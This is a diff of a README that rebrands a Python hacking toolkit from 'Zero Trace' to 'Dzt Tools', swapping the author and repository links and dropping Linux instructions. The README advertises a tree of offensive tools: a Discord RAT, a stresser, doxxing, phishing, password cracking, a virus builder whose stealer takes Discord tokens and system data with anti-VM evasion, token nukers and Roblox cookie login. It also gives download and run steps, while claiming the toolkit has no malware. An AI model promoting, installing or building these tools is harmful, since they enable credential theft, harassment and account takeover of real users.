@@ -1,7 +1,7 @@
-<h1 align="center">Zero Trace</h1>
+<h1 align="center">Dzt Tools</h1>
 
 <p align="center">
- <a href="https://github.com/o9-9">o9</a>
+ <a href="https://github.com/o9-9/dzt">Dzt</a>
 </p>
 
 <p align="center">
@@ -9,9 +9,9 @@
 </p>
 
 <p>
-  - Developed in <strong>Python</strong>, by <a href="https://github.com/Blackeige">Blackeige</a><br>
+  - Developed in <strong>Python</strong>, by <a href="https://github.com/o9-9">o9</a><br>
   - Tool in <strong>English</strong>.<br>
-  - Available on <strong>Windows</strong> and <strong>Linux</strong>.<br>
+  - Available on <strong>Windows</strong>.<br>
   - <strong>No malware</strong> or <strong>backdoor</strong>.<br>
   - <strong>Open Source</strong> only for verification, ensuring no malicious programs.<br>
   - <strong>Frequently updated</strong>.<br>
@@ -19,7 +19,7 @@
   - The tools include: <strong>Scanning, Osint, Utilities, Builder, Roblox, Discord</strong>, and more...
 </p>
 
-<h1 align="center">Tools</h1>
+<h1 align="center">Dzt Tools</h1>
 
 <p align="center">
   <img src="img/preview.png" width="49%"> 
@@ -29,17 +29,17 @@
 <p>
    
 ```
-┌── ⚒️ - RedTiger-Tools
+┌──- RedTiger-Tools
 │   ├── Info
 │   └── Site
 │
-├── 💰 - Paid
+├──- Paid
 │   ├── Python Obfuscator (Premium)
 │   ├── Discord Rat (Premium)
 │   ├── Stresser (Premium)
 │   └── Anonymization Software
 │
-├── 🕵️‍♂️ - Network Scanner
+├──- Network Scanner
 │   ├── Sql Vulnerability Scanner
 │   ├── Website Scanner
 │   ├── Website Url Scanner
@@ -47,7 +47,7 @@
 │   ├── Ip Port Scanner
 │   └── Ip Pinger
 │
-├── 🔎 - Osint
+├──- Osint
 │   ├── Dox Create
 │   ├── Dox Tracker
 │   ├── Get Image Exif
@@ -58,7 +58,7 @@
 │   ├── Phone Number Lookup
 │   └── Ip Lookup
 │
-├── 🔧 - Utilities
+├──- Utilities
 │   ├── Phishing Attack
 │   ├── Password Zip Cracked Attack
 │   ├── Password Decrypted Attack
@@ -67,7 +67,7 @@
 │   ├── Dark Web Links
 │   └── Ip Generator
 │
-├── ☠️ - Virus Builder
+├──- Virus Builder
 │   ├── Stealer
 │   │   ├── System Info: User, System, Ip, Disk, Screen, Location, etc.
 │   │   ├── Discord Token: Token, Email, Phone, Id, Username, etc.
@@ -90,7 +90,7 @@
 │       ├── Anti Vm & Debug
 │       └── Restart Every 5min
 │
-├── 📞 - Discord Tools
+├──- Discord Tools
 │   ├── Token Discord
 │   │   ├── Discord Token Info
 │   │   ├── Discord Token Nuker
@@ -123,7 +123,7 @@
 │   ├── Discord Server Info
 │   └── Discord Nitro Generator
 │
-└── 🎮 - Roblox Tools
+└──- Roblox Tools
     ├── Roblox Cookie Login
     ├── Roblox Cookie Info
     ├── Roblox User Info
@@ -136,23 +136,13 @@
 
 <h1 align="center">Requirements</h1>
 
-<h3>Windows:</h3>
-
 <p>
 - Install <a href="https://www.python.org/downloads/">Python</a> with the <a href="Img/Python_Path.png">PATH</a> options.<br>
-- Windows 10 & 11+
-</p>
-
-<h3>Linux:</h3>
-
-<p>
-- Latest version of <a href="https://www.python.org/downloads/">Python</a>.<br>
-- Recent Linux distribution.
 </p>
 
 <h1 align="center">Installation</h1>
 
-<a href="https://github.com/loxy0dev/ZeroTrace-Tools/archive/refs/tags/v1.0.zip">Download "ZeroTrace-Tools.zip" Here</a>
+<a href="https://github.com/o9-9/dzt/archive/refs/heads/main.zip">Download "dzt.zip" Here</a>
 
 <p>
 1 - Download the .zip folder.
@@ -163,9 +153,9 @@
 
 1 - Open a terminal.
 
-2 - Run "`git clone https://github.com/Blackeige/ZeroTrace-Tools.git`"
+2 - Run "`git clone https://github.com/o9-9/dzt.git`"
 
-3 - cd into the folder "`cd ZeroTrace-Tools`" (if do with `git`)
+3 - cd into the folder "`cd dzt`" (if do with `git`)
 
-4 - Run "`python ZeroTrace.py`"
+4 - Run "`python dzt.py`"
 
